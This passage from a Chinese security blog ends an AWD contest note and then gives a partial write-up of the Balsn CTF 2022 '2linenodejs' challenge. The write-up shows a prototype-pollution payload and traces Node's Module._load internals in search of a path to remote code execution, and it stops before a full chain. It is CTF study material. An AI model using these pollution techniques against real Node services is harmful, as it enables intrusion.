class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.yaml<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>snakeyaml<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.18.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span> </span><br></pre></td></tr></table></figure><h1 id="运维"><a href="#运维" class="headerlink" title="运维"></a>运维</h1><p>队友的运维</p><p>笔记摘要</p><p>Tomcat，可以编一个filter成class，放到指定目录重启就能加载拦截了；</p><p>Springboot的fatjar，尝试javassist、二进制修改，最后发源码才编译成jar上传。</p><p>修复力度过猛，check没过。</p><p>* 代码漏洞只要修改对应的源码，`mvn package`打包即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">[INFO] Scanning for projects...</span><br><span class="line">[INFO] </span><br><span class="line">[INFO] ---------------------&lt; code.shellsniper:EasyCloud &gt;---------------------</span><br><span class="line">[INFO] Building EasyCloud 1.4</span><br><span class="line">[INFO] --------------------------------[ jar ]---------------------------------</span><br><span class="line">[INFO] </span><br><span class="line">[INFO] --- maven-resources-plugin:3.2.0:resources (default-resources) @ EasyCloud ---</span><br><span class="line">[INFO] Using &#x27;UTF-8&#x27; encoding to copy filtered resources.</span><br><span class="line">[INFO] Using &#x27;UTF-8&#x27; encoding to copy filtered properties files.</span><br><span class="line">[INFO] Copying 1 resource</span><br><span class="line">[INFO] Copying 46 resources</span><br><span class="line">[INFO] </span><br><span class="line">[INFO] --- maven-compiler-plugin:3.8.1:compile (default-compile) @ EasyCloud ---</span><br><span class="line">[INFO] Nothing to compile - all classes are up to date</span><br><span class="line">[INFO] </span><br><span class="line">[INFO] --- maven-resources-plugin:3.2.0:testResources (default-testResources) @ EasyCloud ---</span><br><span class="line">[INFO] Using &#x27;UTF-8&#x27; encoding to copy filtered resources.</span><br><span class="line">[INFO] Using &#x27;UTF-8&#x27; encoding to copy filtered properties files.</span><br><span class="line">[INFO] skip non existing resourceDirectory E:\Projects\CTF\202208-EasyCoud\EasyCoud\src\test\resources</span><br><span class="line">[INFO] </span><br><span class="line">[INFO] --- maven-compiler-plugin:3.8.1:testCompile (default-testCompile) @ EasyCloud ---</span><br><span class="line">[INFO] No sources to compile</span><br><span class="line">[INFO] </span><br><span class="line">[INFO] --- maven-surefire-plugin:2.22.2:test (default-test) @ EasyCloud ---</span><br><span class="line">[INFO] No tests to run.</span><br><span class="line">[INFO] </span><br><span class="line">[INFO] --- maven-jar-plugin:3.2.0:jar (default-jar) @ EasyCloud ---</span><br><span class="line">[INFO] Building jar: E:\Projects\CTF\202208-EasyCoud\EasyCoud\target\EasyCloud-1.4.jar</span><br><span class="line">[INFO] </span><br><span class="line">[INFO] --- spring-boot-maven-plugin:2.4.1:repackage (repackage) @ EasyCloud ---</span><br><span class="line">[INFO] Replacing main artifact with repackaged archive</span><br><span class="line">[INFO] ------------------------------------------------------------------------</span><br><span class="line">[INFO] BUILD SUCCESS</span><br><span class="line">[INFO] ------------------------------------------------------------------------</span><br><span class="line">[INFO] Total time:  1.996 s</span><br><span class="line">[INFO] Finished at: 2022-08-27T20:06:54+08:00</span><br><span class="line">[INFO] ------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">Process finished with exit code 0</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;打了一次内部赛AWD，第一次做java，收获颇丰，特此记录。&lt;/p&gt;
&lt;h1 id=&quot;攻防&quot;&gt;&lt;a href=&quot;#攻防&quot; class=&quot;headerlink&quot; title=&quot;攻防&quot;&gt;&lt;/a&gt;攻防&lt;/h1&gt;&lt;h2 id=&quot;0x01&quot;&gt;&lt;a href=&quot;#0x01&quot; class</summary>
      
    
    
    
    <category term="writeup" scheme="https://lhhxs.github.io/categories/writeup/"/>
    
    
    <category term="CTF" scheme="https://lhhxs.github.io/tags/CTF/"/>
    
    <category term="AWD" scheme="https://lhhxs.github.io/tags/AWD/"/>
    
  </entry>
  
  <entry>
    <title>Balsn CTF 2022 inenodejs</title>
    <link href="https://lhhxs.github.io/2022/09/09/writeup/[Balsn%20CTF%202022]2linenodejs/"/>
    <id>https://lhhxs.github.io/2022/09/09/writeup/[Balsn%20CTF%202022]2linenodejs/</id>
    <published>2022-09-09T14:28:02.865Z</published>
    <updated>2022-09-17T12:06:06.830Z</updated>
    
    <content type="html"><![CDATA[<p>这题的出题人去年也出了0linephp和1linephp，用最短的题目搞最骚的操作。想了很多思路不得其解，根据赛后Writeup进行研究复现，主要是分析一下调试的过程。</p><h2 id="env"><a href="#env" class="headerlink" title="env"></a>env</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">│  docker-compose.yml</span><br><span class="line">│  Dockerfile</span><br><span class="line">│  flag</span><br><span class="line">│  readflag.c</span><br><span class="line">│      </span><br><span class="line">└─src</span><br><span class="line">        index.js</span><br><span class="line">        server.js</span><br><span class="line">        usage.js </span><br></pre></td></tr></table></figure><p>附件给了源码以及docker文件。文件较少，从readflag.c可以推测最后需要RCE，可以通过docker运行环境。</p><p>server.js</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/local/bin/node</span></span><br><span class="line">process.<span class="property">stdin</span>.<span class="title function_">setEncoding</span>(<span class="string">&#x27;utf-8&#x27;</span>);</span><br><span class="line">process.<span class="property">stdin</span>.<span class="title function_">on</span>(<span class="string">&#x27;readable&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">try</span>&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;HTTP/1.1 200 OK\nContent-Type: text/html\nConnection: Close\n&#x27;</span>);</span><br><span class="line">    <span class="keyword">const</span> json = process.<span class="property">stdin</span>.<span class="title function_">read</span>().<span class="title function_">match</span>(<span class="regexp">/\?(.*?)\ /</span>)?.[<span class="number">1</span>],</span><br><span class="line">    obj = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(json);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`JSON: <span class="subst">$&#123;json&#125;</span>, Object:`</span>, <span class="built_in">require</span>(<span class="string">&#x27;./index&#x27;</span>)(obj, &#123;&#125;));</span><br><span class="line">  &#125;<span class="keyword">catch</span>&#123;</span><br><span class="line">    <span class="built_in">require</span>(<span class="string">&#x27;./usage&#x27;</span>)</span><br><span class="line">  &#125;<span class="keyword">finally</span>&#123;</span><br><span class="line">    process.<span class="title function_">exit</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;); </span><br></pre></td></tr></table></figure><p>通过process获取输入流，匹配输入的字符串并转化为JSON格式数据（注意这里不能使用空格），最后通过console.log打印；如果输入数据不匹配，则进入require(‘&#x2F;usage’)，最后退出进程。</p><p>usage.js</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Validate your JSON with &lt;a href=&quot;/?&#123;&#125;&quot;&gt;query&lt;/a&gt;&#x27;</span>);</span><br></pre></td></tr></table></figure><p>index.js</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = <span class="function">(<span class="params">O, o</span>) =&gt;</span> (</span><br><span class="line">    <span class="title class_">Object</span>.<span class="title function_">entries</span>(O).<span class="title function_">forEach</span>(</span><br><span class="line">        <span class="function">(<span class="params">[K, V]</span>) =&gt;</span> <span class="title class_">Object</span>.<span class="title function_">entries</span>(V).<span class="title function_">forEach</span>(</span><br><span class="line">            <span class="function">(<span class="params">[k, v]</span>) =&gt;</span> (</span><br><span class="line">                o[K] = o[K] || &#123;&#125;, o[K][k] = v</span><br><span class="line">            )</span><br><span class="line">        )</span><br><span class="line">    ), o); </span><br></pre></td></tr></table></figure><p>这里的代码可读性较差，根据index.js，最终会有<code>(O, &#123;&#125;)</code>两个对象传入函数，通过<code>Object.entries</code>连续获取JSON的两层键值对，最后进行两次赋值：①若o[K]不存在，则置空，否则再次赋值；②将v赋值给o[K][k]。存在比较明显的原型链污染点，可以通过传入<code>&#123;&quot;__proto__&quot;:&#123;&quot;x&quot;:&quot;y&quot;&#125;&#125;</code>污染<code>&#123;&#125;.__proto__</code>，进而影响<code>Object.prototype</code>。</p><p>剩下的就是考虑如何RCE了。在做题时，我们尝试影响<code>Object.entries()</code>以及<code>process</code>，效果不甚理想，最后看官方给的<code>require()</code>，思路确实巧妙。</p><p>前置gadget：<code>[server.js]require(&#39;/usage&#39;)</code> → <code>[helper.js]function require(path)</code> → <code>[loader.js]Module.prototype.require = function(id)</code></p><p><img src="https://oatmeal.vip/wp-content/uploads/2022/09/image-1.png"><br>跟进<code>Module._load</code>，根据函数描述，该函数最终的作用就是加载文件，从该函数入手，看看该函数是如何实现的。</p><h2 id="Module-load"><a href="#Module-load" class="headerlink" title="Module._load"></a>Module._load</h2><p>loader</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Check the cache for the requested file.</span></span><br><span class="line"><span class="comment">// 1. If a module already exists in the cache: return its exports object.</span></span><br><span class="line"><span class="comment">// 2. If the module is native: call</span></span><br><span class="line"><span class="comment">//    `BuiltinModule.prototype.compileForPublicLoader()` and return the exports.</span></span><br><span class="line"><span class="comment">// 3. Otherwise, create a new module for the file and save it to the cache.</span></span><br><span class="line"><span class="comment">//    Then have it load  the file contents before returning its exports</span></span><br><span class="line"><span class="comment">//    object.</span></span><br><span class="line"><span class="title class_">Module</span>.<span class="property">_load</span> = <span class="keyword">function</span>(<span class="params">request, parent, isMain</span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> relResolveCacheIdentifier;</span><br><span class="line">  <span class="keyword">if</span> (parent) &#123;</span><br><span class="line">    <span class="title function_">debug</span>(<span class="string">&#x27;Module._load REQUEST %s parent: %s&#x27;</span>, request, parent.<span class="property">id</span>);</span><br><span class="line">    <span class="comment">// Fast path for (lazy loaded) modules in the same directory. The indirect</span></span><br><span class="line">    <span class="comment">// caching is required to allow cache invalidation without changing the old</span></span><br><span class="line">    <span class="comment">// cache key names.</span></span><br><span class="line">    relResolveCacheIdentifier = <span class="string">`<span class="subst">$&#123;parent.path&#125;</span>\x00<span class="subst">$&#123;request&#125;</span>`</span>;</span><br><span class="line">    <span class="keyword">const</span> filename = relativeResolveCache[relResolveCacheIdentifier];</span><br><span class="line">    <span class="keyword">if</span> (filename !== <span class="literal">undefined</span>) &#123;</span><br><span class="line">      <span class="keyword">const</span> cachedModule = <span class="title class_">Module</span>.<span class="property">_cache</span>[filename];</span><br><span class="line">      <span class="keyword">if</span> (cachedModule !== <span class="literal">undefined</span>) &#123;</span><br><span class="line">        <span class="title function_">updateChildren</span>(parent, cachedModule, <span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">if</span> (!cachedModule.<span class="property">loaded</span>)</span><br><span class="line">          <span class="keyword">return</span> <span class="title function_">getExportsForCircularRequire</span>(cachedModule);</span><br><span class="line">        <span class="keyword">return</span> cachedModule.<span class="property">exports</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">delete</span> relativeResolveCache[relResolveCacheIdentifier];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="title class_">StringPrototypeStartsWith</span>(request, <span class="string">&#x27;node:&#x27;</span>)) &#123;</span><br><span class="line">    <span class="comment">// Slice &#x27;node:&#x27; prefix</span></span><br><span class="line">    <span class="keyword">const</span> id = <span class="title class_">StringPrototypeSlice</span>(request, <span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> <span class="variable language_">module</span> = <span class="title function_">loadBuiltinModule</span>(id, request);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable language_">module</span>?.<span class="property">canBeRequiredByUsers</span>) &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title function_">ERR_UNKNOWN_BUILTIN_MODULE</span>(request);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">module</span>.<span class="property">exports</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> filename = <span class="title class_">Module</span>.<span class="title function_">_resolveFilename</span>(request, parent, isMain);</span><br><span class="line">  <span class="keyword">const</span> cachedModule = <span class="title class_">Module</span>.<span class="property">_cache</span>[filename];</span><br><span class="line">  <span class="keyword">if</span> (cachedModule !== <span class="literal">undefined</span>) &#123;</span><br><span class="line">    <span class="title function_">updateChildren</span>(parent, cachedModule, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">if</span> (!cachedModule.<span class="property">loaded</span>) &#123;</span><br><span class="line">      <span class="keyword">const</span> parseCachedModule = cjsParseCache.<span class="title function_">get</span>(cachedModule);</span><br><span class="line">      <span class="keyword">if</span> (!parseCachedModule || parseCachedModule.<span class="property">loaded</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">getExportsForCircularRequire</span>(cachedModule);</span><br><span class="line">      parseCachedModule.<span class="property">loaded</span> = <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> cachedModule.<span class="property">exports</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> mod = <span class="title function_">loadBuiltinModule</span>(filename, request);</span><br><span class="line">  <span class="keyword">if</span> (mod?.<span class="property">canBeRequiredByUsers</span> &amp;&amp;</span><br><span class="line">      <span class="title class_">BuiltinModule</span>.<span class="title function_">canBeRequiredWithoutScheme</span>(filename)) &#123;</span><br><span class="line">    <span class="keyword">return</span> mod.<span class="property">exports</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Don&#x27;t call updateChildren(), Module constructor already does.</span></span><br><span class="line">  <span class="keyword">const</span> <span class="variable language_">module</span> = cachedModule || <span class="keyword">new</span> <span class="title class_">Module</span>(filename, parent);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (isMain) &#123;</span><br><span class="line">    process.<span class="property">mainModule</span> = <span class="variable language_">module</span>;</span><br><span class="line">    <span class="variable language_">module</span>.<span class="property">id</span> = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title class_">Module</span>.<span class="property">_cache</span>[filename] = <span class="variable language_">module</span>;</span><br><span class="line">  <span class="keyword">if</span> (parent !== <span class="literal">undefined</span>) &#123;</span><br><span class="line">    relativeResolveCache[relResolveCacheIdentifier] = filename;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> threw = <span class="literal">true</span>;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="variable language_">module</span>.<span class="title function_">load</span>(filename);</span><br><span class="line">    threw = <span class="literal">false</span>;</span><br><span class="line">  &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (threw) &#123;</span><br><span class="line">      <span class="keyword">delete</span> <span class="title class_">Module</span>.<span class="property">_cache</span>[filename];</span><br><span class="line">      <span class="keyword">if</span> (parent !== <span class="literal">undefined</span>) &#123;</span><br><span class="line">        <span class="keyword">delete</span> relativeResolveCache[relResolveCacheIdentifier];</span><br><span class="line">        <span class="keyword">const</span> children = parent?.<span class="property">children</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title class_">ArrayIsArray</span>(children)) &#123;</span><br><span class="line">          <span class="keyword">const</span> index = <span class="title class_">ArrayPrototypeIndexOf</span>(children, <span class="variable language_">module</span>);</span><br><span class="line">          <span class="keyword">if</span> (index !== -<span class="number">1</span>) &#123;</span><br><span class="line">            <span class="title class_">ArrayPrototypeSplice</span>(children, index, <span class="number">1</span>);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable language_">module</span>.<span class="property">exports</span> &amp;&amp;</span><br><span class="line">               !<span class="title function_">isProxy</span>(<span class="variable language_">module</span>.<span class="property">exports</span>) &amp;&amp;</span><br><span class="line">               <span class="title class_">ObjectGetPrototypeOf</span>(<span class="variable language_">module</span>.<span class="property">exports</span>) ===</span><br><span class="line">                 <span class="title class_">CircularRequirePrototypeWarningProxy</span>) &#123;</span><br><span class="line">      <span class="title class_">ObjectSetPrototypeOf</span>(<span class="variable language_">module</span>.<span class="property">exports</span>, <span class="title class_">ObjectPrototype</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="variable language_">module</span>.<span class="property">exports</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="从缓存索引中读取文件"><a href="#从缓存索引中读取文件" class="headerlink" title="从缓存索引中读取文件"></a>从缓存索引中读取文件</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// part 1</span></span><br><span class="line"> <span class="keyword">let</span> relResolveCacheIdentifier;</span><br><span class="line"> <span class="keyword">if</span> (parent) &#123;</span><br><span class="line">   <span class="title function_">debug</span>(<span class="string">&#x27;Module._load REQUEST %s parent: %s&#x27;</span>, request, parent.<span class="property">id</span>);</span><br><span class="line">   <span class="comment">// Fast path for (lazy loaded) modules in the same directory. The indirect</span></span><br><span class="line">   <span class="comment">// caching is required to allow cache invalidation without changing the old</span></span><br><span class="line">   <span class="comment">// cache key names.</span></span><br><span class="line">   relResolveCacheIdentifier = <span class="string">`<span class="subst">$&#123;parent.path&#125;</span>\x00<span class="subst">$&#123;request&#125;</span>`</span>;</span><br><span class="line">   <span class="keyword">const</span> filename = relativeResolveCache[relResolveCacheIdentifier];</span><br><span class="line">   <span class="keyword">if</span> (filename !== <span class="literal">undefined</span>) &#123;</span><br><span class="line">     <span class="keyword">const</span> cachedModule = <span class="title class_">Module</span>.<span class="property">_cache</span>[filename];</span><br><span class="line">     <span class="keyword">if</span> (cachedModule !== <span class="literal">undefined</span>) &#123;</span><br><span class="line">       <span class="title function_">updateChildren</span>(parent, cachedModule, <span class="literal">true</span>);</span><br><span class="line">       <span class="keyword">if</span> (!cachedModule.<span class="property">loaded</span>)</span><br><span class="line">         <span class="keyword">return</span> <span class="title function_">getExportsForCircularRequire</span>(cachedModule);</span><br><span class="line">       <span class="keyword">return</span> cachedModule.<span class="property">exports</span>;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">delete</span> relativeResolveCache[relResolveCacheIdentifier];</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><ul><li><code>relResolveCacheIdentifier</code>: 路径缓存标识符，由路径+\x00+请求参数组成</li><li><code>relativeResolveCache</code>: 缓存文件路径存储</li></ul><p>这里的逻辑是从<code>parent.path\x00request</code>中获取路径缓存标识符，在<code>relativeResolveCache</code>中查找。</p><p>本题的<code>relResolveCacheIdentifier</code>:</p><p><img src="https://oatmeal.vip/wp-content/uploads/2022/09/image-2.png"><br>缓存文件路径存储中，只保存了三个参数，其中两个是debug文件，还有一个是server.js，也在缓存文件中，标记undefined。</p><p><img src="https://oatmeal.vip/wp-content/uploads/2022/09/image-3.png"></p><p>这里如果能拿到缓存文件中的存储，是可以从<code>Module._cache[filename]</code>中读取缓存的，但是这里没有我们要的.&#x2F;usage，所以最终没有if语句，直接跳出。</p><p>这里可以原型链污染吗？不可以，控制参数<code>parent.path</code>和<code>request</code>都不可控，必定跳出if语句。再加上缓存文件中没有命令执行的文件，并不是我们需要的目标。</p><h3 id="从-node-中加载核心模块"><a href="#从-node-中加载核心模块" class="headerlink" title="从`node:`中加载核心模块"></a>从`node:`中加载核心模块</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// part 2</span></span><br><span class="line"> <span class="keyword">if</span> (<span class="title class_">StringPrototypeStartsWith</span>(request, <span class="string">&#x27;node:&#x27;</span>)) &#123;</span><br><span class="line">   <span class="comment">// Slice &#x27;node:&#x27; prefix</span></span><br><span class="line">   <span class="keyword">const</span> id = <span class="title class_">StringPrototypeSlice</span>(request, <span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">   <span class="keyword">const</span> <span class="variable language_">module</span> = <span class="title function_">loadBuiltinModule</span>(id, request);</span><br><span class="line">   <span class="keyword">if</span> (!<span class="variable language_">module</span>?.<span class="property">canBeRequiredByUsers</span>) &#123;</span><br><span class="line">     <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title function_">ERR_UNKNOWN_BUILTIN_MODULE</span>(request);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> <span class="variable language_">module</span>.<span class="property">exports</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p><img src="https://oatmeal.vip/wp-content/uploads/2022/09/image-4.png"></p><p>核心模块在源代码编译过程中，被编译成了二进制文件，node进程启动时，部分node核心模块被直接加载进内存，例如os, path, http等模块，以增加运行速度。而<code>node:</code>的用法在前版本中引入，目的是快速定位核心模块，如果识别到<code>node:</code>，进入if语句加载核心模块，若没有加载成功，抛出ERR。</p><p>由于usage不满足条件，没进入循环，同样也不可控。</p><h3 id="通过绝对路径加载缓存和核心模块"><a href="#通过绝对路径加载缓存和核心模块" class="headerlink" title="通过绝对路径加载缓存和核心模块"></a>通过绝对路径加载缓存和核心模块</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// part 3</span></span><br><span class="line"> <span class="keyword">const</span> filename = <span class="title class_">Module</span>.<span class="title function_">_resolveFilename</span>(request, parent, isMain);</span><br><span class="line"> <span class="keyword">const</span> cachedModule = <span class="title class_">Module</span>.<span class="property">_cache</span>[filename];</span><br><span class="line"> <span class="keyword">if</span> (cachedModule !== <span class="literal">undefined</span>) &#123;</span><br><span class="line">   <span class="title function_">updateChildren</span>(parent, cachedModule, <span class="literal">true</span>);</span><br><span class="line">   <span class="keyword">if</span> (!cachedModule.<span class="property">loaded</span>) &#123;</span><br><span class="line">     <span class="keyword">const</span> parseCachedModule = cjsParseCache.<span class="title function_">get</span>(cachedModule);</span><br><span class="line">     <span class="keyword">if</span> (!parseCachedModule || parseCachedModule.<span class="property">loaded</span>)</span><br><span class="line">       <span class="keyword">return</span> <span class="title function_">getExportsForCircularRequire</span>(cachedModule);</span><br><span class="line">     parseCachedModule.<span class="property">loaded</span> = <span class="literal">true</span>;</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">     <span class="keyword">return</span> cachedModule.<span class="property">exports</span>;</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">const</span> mod = <span class="title function_">loadBuiltinModule</span>(filename, request);</span><br><span class="line"> <span class="keyword">if</span> (mod?.<span class="property">canBeRequiredByUsers</span> &amp;&amp;</span><br><span class="line">     <span class="title class_">BuiltinModule</span>.<span class="title function_">canBeRequiredWithoutScheme</span>(filename)) &#123;</span><br><span class="line">   <span class="keyword">return</span> mod.<span class="property">exports</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>这里同样也是加载缓存和核心模块，不同的是通过引入了file的绝对路径，分别查找<code>Module._cache[filename]</code>和<code>BuiltinModule</code>。</p><p>这里是否可控呢？我们可以看到<code>filename</code>通过<code>Module._resolveFilename(request, parent, isMain);</code>控制，如果我们控制了<code>filename</code>，我们就可以通过<code>require</code>函数加载任意文件。</p><h2 id="自定义filename"><a href="#自定义filename" class="headerlink" 